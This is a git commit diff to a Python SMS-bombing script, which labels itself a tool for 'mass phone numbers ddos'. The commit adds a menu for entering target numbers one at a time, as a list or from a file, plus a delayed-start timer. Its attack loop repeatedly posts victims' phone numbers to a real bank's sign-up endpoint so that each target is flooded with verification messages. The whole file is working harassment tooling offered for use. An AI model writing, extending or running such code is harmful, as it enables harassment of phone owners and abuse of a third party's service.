7371d9fca59a5df207940a15746797d4cf12d3f7
Romidorka <artemvasnev01@gmail.com>
2021-04-24 21:29:03 +0600

    Added nice menu, timer attack

--- main.py
+++ main.py
@@ -2,24 +2,42 @@ import requests, module, argparse, time, os
 from module import clr
 phones = []
 messagesSend = 0
-timer = time.time()
+fileName = ""
+timer = int(time.time())
+startTime = time.time()
 
 parser = argparse.ArgumentParser(description="Script for mass phone numbers ddos")
 parser.add_argument('--phone', type=str, help="Path to file with phone numbers")
 args = parser.parse_args()
 
+if args.phone != None:
+    fileName = args.phone
+
+def logo():
+    print(clr.Fore.MAGENTA + module.logo)
+    print(clr.Fore.RED + module.author)
+    print(clr.Fore.CYAN + "\n" * 2)
+
+def clearScrean():
+    if os.name == "nt":
+        os.system("cls")
+    else:
+        os.system("clear")
+
 def attack():
     global timeAttack
-    global timer
+    global startTime
     global messagesSend
-    timer = time.time()
-    os.system("cls")
-    os.system("clear")
-    print(clr.Fore.MAGENTA + module.attackLogo)
-    while time.time() < timer + timeAttack:
+    startTime = time.time()
+    clearScrean()
+    print(clr.Fore.MAGENTA + module.attackLogo + "\n")
+    while time.time() < startTime + timeAttack:
         for _phone in phones:
+            if _phone == "":
+                continue
             try:
-                requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
+                req = requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
+
                 messagesSend+=1
                 print(f"[{messagesSend}] Tinkoff отправлен")
             except:
@@ -89,20 +107,54 @@ def attack():
             #     print(" не отправлен")
             time.sleep(2)
 
+clearScrean()
+logo()
 
-print(clr.Fore.MAGENTA + module.logo)
-print(clr.Fore.RED + module.author)
+print(clr.Fore.CYAN + module.choice)
 
-with open(args.phone, "r") as file:
-    phones = file.read().split("\n")
-
-print(clr.Fore.CYAN + "\n" * 2)
-print("Номера телефонов в файле:")
+mode = input("Выберите режим: ")
+if mode == "1":
+    clearScrean()
+    logo()
+    phones = [input("Введите номер телефона: ")]
+elif mode == "2":
+    clearScrean()
+    logo()
+    phones = input("Введите номера: ").split(" ")
+elif mode == "3":
+    clearScrean()
+    logo()
+    if fileName == "":
+        fileName = input("Введите название файла: ")
+    with open(fileName, "r") as file:
+        phones = file.read().split("\n")
+        for i in range(phones.count("")):
+            phones.remove("")
+elif mode == "4":
+    quit()
+print("\nНомера телефонов для атаки:")
 for i in range(len(phones)):
     print("[" + str(i+1) + "]: " + phones[i])
 
 timeAttack = int(input("\n" + clr.Fore.RED + "Введи время атаки (в секундах): "))
 
-answ = input("\n" + clr.Fore.RED + "Вы хотите запустить атаку? (1 - Да, 2 - Нет): ")
+answ = input("\n" + clr.Fore.RED + "Вы хотите запустить атаку? (1 - Да, 2 - По таймеру, 3 - Нет): ")
 if answ == "1":
     attack()
+elif answ == "2":
+    waitTimeRaw = input("\nЧерез сколько запустить спам (мин:секунды): ").split(":")
+    waitTime = int(waitTimeRaw[0]) * 60 + int(waitTimeRaw[1])
+
+    timer = int(time.time())
+    lastval = int(time.time()) - timer
+    clearScrean()
+    logo()
+
+    while int(time.time()) - timer < waitTime:
+        # print(time.time() - timer)
+        if lastval != int(time.time()) - timer:
+            lastval = int(time.time()) - timer
+            print("Осталось: " + str(waitTime - lastval))
+    attack()
+elif answ == "3":
+    quit()
